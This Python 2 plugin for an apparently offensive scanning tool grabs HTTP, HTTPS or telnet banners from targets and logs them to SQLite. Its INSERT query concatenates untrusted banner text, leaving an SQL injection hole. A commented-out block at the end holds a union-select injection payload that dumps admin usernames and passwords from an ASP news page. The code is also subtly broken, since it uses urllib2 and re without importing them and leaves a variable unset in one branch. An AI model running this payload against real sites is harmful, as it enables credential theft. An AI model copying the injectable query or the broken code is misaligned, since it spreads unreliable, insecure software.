# -*- coding: cp936 -*-
'''
Demo modules for ass_hole_hunter
Reprouct from mst
'''

from libs.functions import *
import telnetlib
import socket
import urllib
import sqlite3
import sys

sys.path.append('dbs/')
from config import global_config

def test():
    print "[!]test success!"

class hunter_plugin:
    infos = {
        'plugin_name':'Title_banner_hunter',
        'author':'demon',
        'update':'2015/04/14',
        'site':'http://www.dawner.info',
        }
    opts  = {
        'ip':'192.168.1.20',
        'port':'80',
        }
    def __init__(self,url):
        #self.ip = ip
        #self.port = port
        self.url = url.strip()

    def exploit(self):
        print "Start to connect "+self.url+'...'
        
        '''connect sqldb'''
        result_db_path = global_config.infos['result_path']+"/result.db"
        cx = sqlite3.connect(result_db_path)
        cu = cx.cursor()
        
        '''get ip and port'''
        if ":" in self.url:
            ip = self.url.split(':')[0]
            port = self.url.split(':')[1].strip()
        else:
            ip = self.url.strip()
            port = "80"

        '''start exploit'''
        #url = pre_url+":"+str(port)
        timeout = 2
        socket.setdefaulttimeout(timeout)        
        url = "http://"+ip+":"+str(port)
        url_s = "https://"+ip+":"+str(port)
        print url
        print url_s
        try:    
            #url = "http://192.168.10.103:23"
            req = urllib2.Request(url)
            #========代理=========#
            #proxy_handler = urllib2.ProxyHandler({'http': 'http://127.0.0.1:8080/'})
            #proxy_auth_handler = urllib2.HTTPBasicAuthHandler()
            #opener = urllib2.build_opener(proxy_handler, proxy_auth_handler)
            #req = urllib2.Request(url)
            #content = opener.open(req).read()
            #====================#
            req.add_header('User-Agent','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')
            req.add_header('referer','http://www.baidu.com')
            #content = opener.open(req).read()
            content = urllib2.urlopen(req).read()
            #print content
            title_content = re.findall(r"<title>.*</title>",content)
            resp = title_content[0][7:-8]
            protocol = 'http'
            status = 'y'
        except:
            print "[x]Http failed,try https..."
            
            try:
                req = urllib2.Request(url_s)
                #========代理=========#
                #proxy_handler = urllib2.ProxyHandler({'http': 'http://127.0.0.1:8080/'})
                #proxy_auth_handler = urllib2.HTTPBasicAuthHandler()
                #opener = urllib2.build_opener(proxy_handler, proxy_auth_handler)
                #req = urllib2.Request(url)
                #content = opener.open(req).read()
                #====================#
                req.add_header('User-Agent','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')
                req.add_header('referer','http://www.baidu.com')
                #content = opener.open(req).read()
                content = urllib2.urlopen(req).read()
                #print content
                title_content = re.findall(r"<title>.*</title>",content)
                protocol = 'https'
                status = 'y'
            except:
                print "[x]Https failed,try telnet..."
                try:
                    tel = telnetlib.Telnet(ip,port,2)
                    resp = tel.read_some()
                    protocol = 'other'
                    status = 'o'
                except Exception,e:
                    print "[x]Unexpected error!"
                    print e
                    resp = 'ass_error'
                    protocol = 'error'
                    status = 'e'
                    return None

        #resp = resp.decode('utf-8', 'ignore')
        try:
            resp = resp.decode('utf-8')
        except Exception,e:
            resp = resp.decode('gbk')
            print e
        print '[+]Banner: '+resp
        print '[+]Protocol: '+protocol
        print '[+]Status: '+status

        '''start to insert sql'''
        insert = "INSERT INTO result (url ,protocol, banner, cms_type ,vuln_path) VALUES ('"+self.url+"','"+protocol +"','"+resp+"','','')"
        print insert
        try:
            cu.execute(insert)
            cx.commit()
            cu.execute("select * from result")
            print "Result:\n"+ str(cu.fetchall())
        except Exception,e:
            print e
        return resp,protocol

        
        #if RPORT == '443':
        #    url = 'https://%s%s'%(RURL,RPATH)
        #else:
        #    url = 'http://%s:%s%s'%(RURL,RPORT,RPATH)
        #exp = url+"NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20''='"
        #color.cprint("[*] Sending exp..",YELLOW)
        #ok  = fuck.urlget(exp)
        #if ok.getcode() == 200:
        #    tmp=fuck.find('[>]+\w+[|]+\w+[<]+',ok.read())
        #    if len(tmp)>0:
        #        color.cprint("[*] Exploit Successful !",GREEN)
        #        i=1
        #        for res in tmp:
        #            res=res[1:len(res)-1]
        #            color.cprint("[%s] %s"%(i,res),GREEN)
        #            i+=1
        #    else:
        #        color.cprint("[!] TARGET NO VULNERABLE !",RED)
        #else:
        #    color.cprint("[!] EXPLOIT FALSE ! CODE:%s"%ok.getcode(),RED)
